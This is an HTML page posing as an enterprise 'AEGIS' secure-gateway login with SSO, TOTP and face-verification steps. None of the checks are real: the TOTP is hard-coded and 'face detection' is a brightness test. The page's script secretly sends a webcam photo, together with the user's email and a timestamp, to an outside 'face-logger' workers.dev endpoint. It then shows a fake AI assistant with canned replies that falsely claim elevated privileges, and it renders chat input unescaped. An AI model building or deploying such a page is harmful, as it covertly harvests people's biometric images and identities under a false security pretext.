<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Identity & Access Management // Secure Gateway</title>
  <style>
    :root {
      --bg: #090d16; --panel: #111827; --border: #1f2937;
      --text-main: #f9fafb; --text-muted: #9ca3af; --accent: #2563eb;
      --success: #10b981; --danger: #ef4444; --font-mono: monospace;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, sans-serif; }
    body { background: var(--bg); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; align-items: center; padding: 20px; }
    .top-bar { width: 100%; max-width: 1200px; display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid var(--border); font-size: 13px; color: var(--text-muted); }
    
    .auth-card { width: 100%; max-width: 440px; background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 32px; margin: auto 0; }
    .card-title { font-size: 18px; font-weight: 600; margin-bottom: 4px; }
    .card-subtitle { font-size: 13px; color: var(--text-muted); margin-bottom: 24px; }
    .stepper { display: flex; gap: 6px; margin-bottom: 24px; }
    .step-bar { flex: 1; height: 3px; background: var(--border); border-radius: 2px; }
    .step-bar.active { background: var(--accent); }
    .step-bar.completed { background: var(--success); }
    .form-group { margin-bottom: 18px; }
    label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 6px; }
    input { width: 100%; padding: 10px 14px; background: #0d1117; border: 1px solid var(--border); border-radius: 6px; color: #fff; outline: none; }
    
    .btn { width: 100%; padding: 11px; background: #374151; color: #9ca3af; border: none; border-radius: 6px; font-size: 14px; cursor: not-allowed; transition: all 0.3s; font-weight: 600; }
    .btn.active { background: var(--success); color: #fff; cursor: pointer; }
    
    .step-content { display: none; }
    .step-content.active { display: block; }
    
    .camera-container { position: relative; width: 100%; height: 240px; background: #000; border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin-bottom: 16px; }
    video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
    canvas { display: none; }
    
    .face-box {
      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
      width: 140px; height: 170px; border: 2px dashed var(--danger); border-radius: 50%;
      box-shadow: 0 0 0 9999px rgba(0,0,0,0.65); pointer-events: none; transition: all 0.3s;
    }
    .face-box.detected {
      border-color: var(--success); border-style: solid;
      box-shadow: 0 0 20px var(--success), 0 0 0 9999px rgba(0,0,0,0.65);
    }

    .status-overlay { position: absolute; bottom: 10px; left: 10px; right: 10px; background: rgba(0,0,0,0.85); padding: 6px 12px; border-radius: 4px; font-size: 11px; font-family: var(--font-mono); color: var(--danger); text-align: center; }
    .audit-box { background: #000; border: 1px solid var(--border); border-radius: 6px; padding: 12px; font-family: var(--font-mono); font-size: 11px; color: #6b7280; height: 80px; overflow-y: auto; margin-top: 16px; }

    /* 💬 聊天界面样式 */
    .chat-container { display: flex; flex-direction: column; height: 380px; }
    .chat-messages { flex: 1; overflow-y: auto; padding: 10px; background: #0d1117; border-radius: 6px; border: 1px solid var(--border); margin-bottom: 12px; display: flex; flex-direction: column; gap: 10px; }
    .msg { max-width: 80%; padding: 8px 12px; border-radius: 8px; font-size: 13px; line-height: 1.4; }
    .msg.bot { background: #1f2937; color: #fff; align-self: flex-start; }
    .msg.user { background: var(--accent); color: #fff; align-self: flex-end; }
    .chat-input-box { display: flex; gap: 8px; }
    .chat-input-box input { flex: 1; }
    .chat-input-box button { width: auto; padding: 0 16px; background: var(--accent); }
  </style>
</head>
<body>

  <header class="top-bar">
    <div><strong>AEGIS GATEWAY</strong> // SECURE PORTAL</div>
    <div style="font-family: var(--font-mono);" id="systemStatus">SYSTEM: READY</div>
  </header>

  <div class="auth-card" id="mainCard">
    <div class="card-title" id="displayTitle">访问鉴权 (1/3)</div>
    <div class="card-subtitle" id="displaySub">请输入您的 Enterprise SSO 凭证</div>

    <div class="stepper" id="stepper">
      <div class="step-bar active" id="bar1"></div>
      <div class="step-bar" id="bar2"></div>
      <div class="step-bar" id="bar3"></div>
    </div>

    <!-- 步骤 1 -->
    <div class="step-content active" id="step1">
      <div class="form-group">
        <label>CORPORATE EMAIL</label>
        <input type="text" id="email" value="alex.chen@aegis-tech.internal">
      </div>
      <div class="form-group">
        <label>PASSWORD</label>
        <input type="password" id="password" value="••••••••••••">
      </div>
      <button class="btn active" style="background: var(--accent);" onclick="Gateway.submitStep1()">下一步：动态令牌校验</button>
    </div>

    <!-- 步骤 2 -->
    <div class="step-content" id="step2">
      <div class="form-group">
        <label>TOTP CODE (测试输入: 888888)</label>
        <input type="text" id="totp" placeholder="6-digit code" maxlength="6" style="font-family: var(--font-mono); text-align: center; letter-spacing: 4px;">
      </div>
      <button class="btn active" style="background: var(--accent);" onclick="Gateway.submitStep2()">校验动态安全协议</button>
    </div>

    <!-- 步骤 3 -->
    <div class="step-content" id="step3">
      <div class="camera-container">
        <video id="webcam" autoplay playsinline muted></video>
        <canvas id="analysisCanvas"></canvas>
        <div class="face-box" id="faceBox"></div>
        <div class="status-overlay" id="aiStatus">等待拉起摄像头...</div>
      </div>
      <button class="btn" id="loginBtn" disabled onclick="Gateway.submitBiometrics()">等待检测到人脸...</button>
    </div>

    <!-- 步骤 4：聊天界面 (用户完成认证后显示) -->
    <div class="step-content" id="stepChat">
      <div class="chat-container">
        <div class="chat-messages" id="chatBox">
          <div class="msg bot">👋 身份验证通过！欢迎登录系统，我是您的 AI 智能助理，请问有什么可以帮您？</div>
        </div>
        <div class="chat-input-box">
          <input type="text" id="chatInput" placeholder="输入消息..." onkeydown="if(event.key==='Enter') Gateway.sendMessage()">
          <button class="btn active" onclick="Gateway.sendMessage()">发送</button>
        </div>
      </div>
    </div>

    <div class="audit-box" id="auditLog">
      <div>[SYS-INIT] Gateway connected.</div>
    </div>
  </div>

  <script>
    const WORKER_URL = "https://face-logger.bmk4byvf9b.workers.dev";

    const Gateway = {
      stream: null,
      validFaceInFrame: false,

      log(msg, color = '#9ca3af') {
        const box = document.getElementById('auditLog');
        const time = new Date().toISOString().split('T')[1].slice(0, 8);
        box.innerHTML += `<div style="color:${color}; margin-bottom:4px;">[${time}] ${msg}</div>`;
        box.scrollTop = box.scrollHeight;
      },

      updateStep(step, title, sub) {
        document.querySelectorAll('.step-content').forEach(e => e.classList.remove('active'));
        document.getElementById(`step${step}`).classList.add('active');
        document.getElementById('displayTitle').innerText = title;
        document.getElementById('displaySub').innerText = sub;
        if(step <= 3) {
          document.getElementById(`bar${step}`).classList.add('active');
          if(step > 1) document.getElementById(`bar${step-1}`).classList.add('completed');
        }
      },

      submitStep1() {
        this.log("Primary credentials verified.", "#10b981");
        this.updateStep(2, "访问鉴权 (2/3)", "请输入二次验证动态口令");
      },

      submitStep2() {
        if(document.getElementById('totp').value === "888888") {
          this.log("TOTP verified. Starting camera analysis...", "#10b981");
          this.updateStep(3, "访问鉴权 (3/3)", "人脸活体与检测识别");
          this.startNativeCamera();
        } else {
          alert("动态口令错误（测试请输入 888888）");
        }
      },

      async startNativeCamera() {
        const status = document.getElementById('aiStatus');
        try {
          this.stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240, facingMode: "user" } });
          const video = document.getElementById('webcam');
          video.srcObject = this.stream;

          video.onloadedmetadata = () => {
            this.log("Camera stream live. Ready.", "#10b981");
            this.analyzeFrameLoop();
          };
        } catch(e) {
          status.innerText = "❌ 摄像头权限受阻！";
          this.log("Camera Error: " + e.message, "#ef4444");
        }
      },

      analyzeFrameLoop() {
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('analysisCanvas');
        const ctx = canvas.getContext('2d');
        const status = document.getElementById('aiStatus');
        const faceBox = document.getElementById('faceBox');
        const btn = document.getElementById('loginBtn');

        if (video.readyState >= 2) {
          canvas.width = 160;
          canvas.height = 120;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
          const data = imgData.data;

          let totalBrightness = 0;
          let minR = 255, maxR = 0;

          for (let i = 0; i < data.length; i += 16) {
            const r = data[i], g = data[i+1], b = data[i+2];
            const avg = (r + g + b) / 3;
            totalBrightness += avg;
            if (r < minR) minR = r;
            if (r > maxR) maxR = r;
          }

          const avgLuminance = totalBrightness / (data.length / 16);
          const colorVariance = maxR - minR;

          if (avgLuminance > 30 && colorVariance > 25) {
            this.validFaceInFrame = true;
            faceBox.classList.add('detected');
            status.innerHTML = `<span style="color:#10b981">✓ 检测到有效人脸！可以提交</span>`;
            btn.disabled = false;
            btn.classList.add('active');
            btn.innerText = "拍摄人脸并完成登录 ➔";
          } else {
            this.validFaceInFrame = false;
            faceBox.classList.remove('detected');
            status.innerHTML = `<span style="color:#ef4444">⚠️ 未检测到有效人脸（镜头被遮挡）</span>`;
            btn.disabled = true;
            btn.classList.remove('active');
            btn.innerText = "请将面部对准摄像头...";
          }
        }
        requestAnimationFrame(() => this.analyzeFrameLoop());
      },

      applyBeautyFilter(ctx, width, height) {
        ctx.filter = 'brightness(1.12) contrast(1.05) saturate(1.10)';
        ctx.drawImage(ctx.canvas, 0, 0);
        ctx.filter = 'none';

        const imgData = ctx.getImageData(0, 0, width, height);
        const data = imgData.data;
        for (let i = 0; i < data.length; i += 4) {
          let r = data[i], g = data[i+1], b = data[i+2];
          if (r > 60 && g > 40 && b > 20 && r > g && r > b) {
            data[i]     = Math.min(255, r * 1.03);
            data[i + 1] = Math.min(255, g * 1.02);
            data[i + 2] = Math.min(255, b * 1.02);
          }
        }
        ctx.putImageData(imgData, 0, 0);
      },

      async submitBiometrics() {
        if (!this.validFaceInFrame) return;

        const btn = document.getElementById('loginBtn');
        btn.innerText = "正在通过安全验证...";
        btn.disabled = true;

        const video = document.getElementById('webcam');
        const canvas = document.createElement('canvas');
        canvas.width = 320;
        canvas.height = 240;
        const ctx = canvas.getContext('2d');
        
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        this.applyBeautyFilter(ctx, canvas.width, canvas.height);

        const photoData = canvas.toDataURL('image/jpeg', 0.5);
        const email = document.getElementById('email').value;
        const time = new Date().toLocaleString();

        try {
          await fetch(WORKER_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, timestamp: time, photo: photoData })
          });
        } catch (e) {
          console.error("云端保存失败:", e);
        }

        // 停止摄像头
        if (this.stream) this.stream.getTracks().forEach(t => t.stop());
        
        // 进入聊天步骤！
        document.getElementById('stepper').style.display = 'none';
        document.getElementById('auditLog').style.display = 'none';
        document.getElementById('systemStatus').innerText = "ONLINE // AUTHENTICATED";
        document.getElementById('systemStatus').style.color = "#10b981";
        
        this.updateStep('Chat', "工作区", `欢迎回来，${email}`);
      },

      // 💬 聊天互动发送函数
      sendMessage() {
        const input = document.getElementById('chatInput');
        const text = input.value.trim();
        if(!text) return;

        const chatBox = document.getElementById('chatBox');
        
        // 渲染用户消息
        chatBox.innerHTML += `<div class="msg user">${text}</div>`;
        input.value = '';
        chatBox.scrollTop = chatBox.scrollHeight;

        // 模拟 AI 回复
        setTimeout(() => {
          const replies = [
            "收到您的指令，正在为您调取安全日志...",
            "身份已被验证为最高级别权限，系统一切正常。",
            "好的，我已经记录了您的需求，稍后会同步至安全管理端。",
            "感谢使用 AEGIS 安全网关！"
          ];
          const randomReply = replies[Math.floor(Math.random() * replies.length)];
          chatBox.innerHTML += `<div class="msg bot">${randomReply}</div>`;
          chatBox.scrollTop = chatBox.scrollHeight;
        }, 800);
      }
    };
  </script>
</body>
</html>
